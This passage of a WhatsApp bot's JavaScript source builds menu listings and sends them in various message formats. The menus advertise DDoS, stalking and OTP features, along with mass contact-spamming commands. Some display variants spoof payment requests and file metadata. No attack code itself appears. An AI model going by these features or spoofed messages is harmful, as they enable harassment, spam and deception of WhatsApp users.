title: 'Menu Api', 
description: "<!> Displays the Api Menu", 
id: '.apimenu'
},
{
title: 'Menu Anime', 
description: "<!> Displays the Anime Menu", 
id: '.animemenu'
},
{
title: 'Menu Asupan', 
description: "<!> Displays the Asupan Menu", 
id: '.asupanmenu'
},
{
title: 'Menu Berita', 
description: "<!> Displays the Berita Menu", 
id: '.beritamenu'
},
{
title: 'Menu Cucimata', 
description: "<!> Displays the Cucimata Menu", 
id: '.cucimata'
},
{
title: 'Menu Convert', 
description: "<!> Displays the Convert Menu", 
id: '.convertmenu'
},
{
title: 'Menu Domain', 
description: "<!> Displays the Domain Menu", 
id: '.domainmenu'
},
{
title: 'Menu Ephoto', 
description: "<!> Displays the Ephoto Menu", 
id: '.ephotomenu'
},
{
title: 'Menu E-Perpus', 
description: "<!> Displays the E-Perpus Menu", 
id: '.e-perpusmenu'
},
{
title: 'Menu Fun', 
description: "<!> Displays the Fun Menu", 
id: '.funmenu'
},
{
title: 'Menu Game', 
description: "<!> Displays the Game Menu", 
id: '.gamemenu'
},
{
title: 'Menu Get', 
description: "<!> Displays the Get Menu", 
id: '.getmenu'
},
{
title: 'Menu Islam', 
description: "<!> Displays the Islam Menu", 
id: '.islammenu'
},
{
title: 'Menu Pm2', 
description: "<!> Displays the Pm2 Menu", 
id: '.pm2menu'
},
{
title: 'Menu Vps', 
description: "<!> Displays the Vps Menu", 
id: '.vpsmenu'
},
{
title: 'Menu Nsfw', 
description: "<!> Displays the Nsfw Menu", 
id: '.nsfwmenu'
},
{
title: 'Menu Otp', 
description: "<!> Displays the Otp Menu", 
id: '.otpmenu'
},
{
title: 'Menu Otomatis', 
description: "<!> Displays the Otomatis Menu", 
id: '.otomatismenu'
},
{
title: 'Menu Random', 
description: "<!> Displays the Random Menu", 
id: '.randommenu'
},
{
title: 'Menu Randomphoto', 
description: "<!> Displays the Randomphoto Menu", 
id: '.randomphoto'
},
{
title: 'Menu Set', 
description: "<!> Displays the Set Menu", 
id: '.setmenu'
},
{
title: 'Menu Stalk', 
description: "<!> Displays the Stalk Menu", 
id: '.stalkmenu'
},
{
title: 'Menu Store', 
description: "<!> Displays the Store Menu", 
id: '.storemenu'
},
{
title: 'Menu Testi', 
description: "<!> Displays the Testi Menu", 
id: '.testimenu'
},
{
title: 'Menu Texpro', 
description: "<!> Displays the Textpro Menu", 
id: '.textpro'
},
{
title: 'Menu Vn', 
description: "<!> Displays the Vn Menu", 
id: '.vnmenu'
},
{
title: 'Set-Menu Bot', 
description: "Change Type Menu Bot", 
id: '.set-menu'
},{
title: 'Menu DDOS', 
description: "<!> Displays the DDOS Menu", 
id: '.ddosmenu'
}]
}]
let listMessage = {
    title: 'LIST MENU REZZ BOTZ', 
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'Powered By Rerez', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: tekss
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by Rerez')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hello, @${m.sender.replace(/@.+/g, '')}!*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: fs.readFileSync('./media/menu.mp4'), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6281288031294\",\"merchant_url\":\"https://wa.me/6281288031294\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"📃 SECRIPT\",\"url\":\"https://whatsapp.com/channel/0029VacxTsC8F2p5dshCmq3r\",\"merchant_url\":\"https://whatsapp.com/channel/0029VacxTsC8F2p5dshCmq3r\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
*/
case 'menuv2': case 'menu2': {
if (!isRegistered) return reply2(mess.regis)
await loading()
wek = `Haii @${m?.sender.split('@')[0]}
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼

${readmore}
${simbolatas}
${simbol} *L I S T - M E N U*
${simboltengah}
${global.tTeks}allmenu
${global.tTeks}ᴀɪᴍᴇɴᴜ
${global.tTeks}apimenu
${global.tTeks}ᴀɴɪᴍᴇᴍᴇɴᴜ
${global.tTeks}ᴀsᴜᴘᴀɴᴍᴇɴᴜ
${global.tTeks}ʙᴇʀɪᴛᴀᴍᴇɴᴜ
${global.tTeks}ᴄᴜᴄɪᴍᴀᴛᴀ
${global.tTeks}convertmenu
${global.tTeks}ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ
${global.tTeks}ᴅᴏᴍᴀɪɴᴍᴇɴᴜ
${global.tTeks}ᴇᴘʜᴏᴛᴏᴍᴇɴᴜ
${global.tTeks}e-perpusmenu
${global.tTeks}ғᴜɴᴍᴇɴᴜ
${global.tTeks}ɢʀᴏᴜᴘᴍᴇɴᴜ
${global.tTeks}gamemenu
${global.tTeks}getmenu
${global.tTeks}ɪsʟᴀᴍᴍᴇɴᴜ
${global.tTeks}jadibotmenu
${global.tTeks}linodemenu
${global.tTeks}pm2menu
${global.tTeks}vpsmenu
${global.tTeks}mainmenu
${global.tTeks}ɴsғᴡᴍᴇɴᴜ
${global.tTeks}otomatismenu
${global.tTeks}ᴏᴛᴘᴍᴇɴᴜ
${global.tTeks}ᴏᴡɴᴇʀᴍᴇɴᴜ
${global.tTeks}ᴘᴀɴᴇʟᴍᴇɴᴜ
${global.tTeks}ʀᴀɴᴅᴏᴍᴍᴇɴᴜ
${global.tTeks}ʀᴀɴᴅᴏᴍᴘʜᴏᴛᴏ
${global.tTeks}rpgmenu
${global.tTeks}searchmenu
${global.tTeks}setmenu
${global.tTeks}sᴛᴀʟᴋᴍᴇɴᴜ
${global.tTeks}sᴛᴏʀᴇᴍᴇɴᴜ
${global.tTeks}ᴛᴇsᴛɪᴍᴇɴᴜ
${global.tTeks}textpro
${global.tTeks}ᴛᴏᴏʟsᴍᴇɴᴜ
${global.tTeks}vnmenu
${global.tTeks}voicechangermenu
${simbolbawah}
${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'mainmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `Haii ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼

${readmore}

${simbolatas}
${simbol0} *M A I N - M E N U*
${simboltengah}
${global.tTeks}autoread *on / off*
${global.tTeks}autobio *on / off*
${global.tTeks}autodlgc *on / off*
${global.tTeks}brainly *Query*
${global.tTeks}bagi 
${global.tTeks}buyprem
${global.tTeks}btc *text*
${global.tTeks}botcomment *text*
${global.tTeks}block *Nomor*
${global.tTeks}claim
${global.tTeks}cekvps
${global.tTeks}del *Reply*
${global.tTeks}darkjoke
${global.tTeks}editmsg *reply*
${global.tTeks}hitday
${global.tTeks}jadwal
${global.tTeks}kali
${global.tTeks}kurang
${global.tTeks}listacc
${global.tTeks}listfont
${global.tTeks}listmodapk
${global.tTeks}listtemplate
${global.tTeks}memeindo
${global.tTeks}meme
${global.tTeks}owner
${global.tTeks}ping
${global.tTeks}pesan *text*
${global.tTeks}public
${global.tTeks}qcimg *text* 
${global.tTeks}qc *text*
${global.tTeks}qc2 *text*
${global.tTeks}restart
${global.tTeks}register 
${global.tTeks}runtime
${global.tTeks}roboguru *Query*
${global.tTeks}server 
${global.tTeks}self
${global.tTeks}sticker *Reply Img*
${global.tTeks}s-avatar *Reply Img*
${global.tTeks}script
${global.tTeks}stickmeme *text*
${global.tTeks}smeme *text*
${global.tTeks}textblank
${global.tTeks}tes
${global.tTeks}tqto
${global.tTeks}tambah
${global.tTeks}unblock *Nomor*
${global.tTeks}ytcomment *text*
${simbolbawah}
${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'ownermenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *O W N E R - M E N U*
${simboltengah}
${global.tTeks}addcase *case*
${global.tTeks}addprem *nomor day*
${global.tTeks}autojpm *on / off*
${global.tTeks}backup
${global.tTeks}bcgc *text*
${global.tTeks}bcimg *Image*
${global.tTeks}bcimg2 *Image*
${global.tTeks}bandwidth
${global.tTeks}cekdrive
${global.tTeks}cekidgc
${global.tTeks}cekip/ip *Link*
${global.tTeks}creategc *text*
${global.tTeks}delsesi
${global.tTeks}delprem *nomor*
${global.tTeks}delcase *case*
${global.tTeks}getcase *name case*
${global.tTeks}jpmimg *image*
${global.tTeks}listcase
${global.tTeks}listown
${global.tTeks}listgc
${global.tTeks}listpc
${global.tTeks}listprem
${global.tTeks}myip
${global.tTeks}nowa *62xx*
${global.tTeks}onlygc *enable / disable*
${global.tTeks}onlypc *enable / disable*
${global.tTeks}pushkontak *text*
${global.tTeks}pushkontak2 *text|Idgc*
${global.tTeks}pushmember *text*
${global.tTeks}save *text*
${global.tTeks}totalfitur
${global.tTeks}whois *Link*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'groupmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
wek = `Haii ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *G R O U P - M E N U*
${simboltengah}
${global.tTeks}add *628xx*
${global.tTeks}antilink *enable / disable*
${global.tTeks}antibot *enable / disable*
${global.tTeks}closetime *text*
${global.tTeks}clone *idgc*
${global.tTeks}cekasalmember
${global.tTeks}delppgc
${global.tTeks}demote *628xx*
${global.tTeks}demoteall
${global.tTeks}editdesk *text*
${global.tTeks}editgroup *close / open*
${global.tTeks}editinfo *on / off*
${global.tTeks}editsubjek *text*
${global.tTeks}ephemeral *on / off*
${global.tTeks}friend
${global.tTeks}getidgc
${global.tTeks}getkontak
${global.tTeks}hidetag *text*
${global.tTeks}inspect *text*
${global.tTeks}invite *nomor*
${global.tTeks}join *Link*
${global.tTeks}kick *628xx*
${global.tTeks}kickall
${global.tTeks}leave
${global.tTeks}linkgroup
${global.tTeks}liston
${global.tTeks}mute *reply*
${global.tTeks}opentime *text*
${global.tTeks}promote *628xx*
${global.tTeks}promoteall
${global.tTeks}pushkontak *text*
${global.tTeks}react *Emoji*
${global.tTeks}resetlinkgc
${global.tTeks}sendlinkgc *628xx*
${global.tTeks}setdesk *text*
${global.tTeks}setname *text*
${global.tTeks}tagall *text*
${global.tTeks}totag *Reply*
${global.tTeks}welcome *enable / disable*
${global.tTeks}larangan
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'downloadmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *D O W N L O A D - M E N U*
${simbol0}
${global.tTeks}9appsdl *link*
${global.tTeks}android1 *query*
${global.tTeks}android1dl *link*
${global.tTeks}amv *1/2*
${global.tTeks}apk *id*
${global.tTeks}apkdl *link*
${global.tTeks}apktoide *query*
${global.tTeks}apktoidedl *package*
${global.tTeks}apkmirror *link*
${global.tTeks}apkfab *link*
${global.tTeks}apkfabsearch *query*
${global.tTeks}bandcamp *query*
${global.tTeks}bandcampdl *link*
${global.tTeks}cocofun *ink*
${global.tTeks}cocofun2 *link*
${global.tTeks}capcut *link*
${global.tTeks}capcut2 *link*
${global.tTeks}devianart *query*
${global.tTeks}devianartdl *link*
${global.tTeks}douyin *link*
${global.tTeks}douyinmp3 *link*
${global.tTeks}facebook *link*
${global.tTeks}facebook2 *link*
${global.tTeks}getmusic *reply*
${global.tTeks}getvideo *reply*
${global.tTeks}gitclone *link*
${global.tTeks}gdrive *link*
${global.tTeks}giphy *query*
${global.tTeks}googlepodcast *query*
${global.tTeks}getweb *link*
${global.tTeks}highlights *link*
${global.tTeks}happymod *query*
${global.tTeks}happymoddl *link*
${global.tTeks}imgur *link*
${global.tTeks}instagram *link*
${global.tTeks}instagram2 *link*
${global.tTeks}igdl *link*
${global.tTeks}ig *link*
${global.tTeks}igjpg *link*
${global.tTeks}igstory *query*
${global.tTeks}imdb *query movie*
${global.tTeks}joox *query*
${global.tTeks}jooxdl *link*
${global.tTeks}kusonime *query*
${global.tTeks}kusonime2 *query*
${global.tTeks}kusonimeget *link*
${global.tTeks}kiryuusearch *query*
${global.tTeks}krakendl *link*
${global.tTeks}likevideo *link*
${global.tTeks}linestick *link*
${global.tTeks}mangatoons *query*
${global.tTeks}mangatoons2 *query*
${global.tTeks}mangasearch *query*
${global.tTeks}megadl *link*
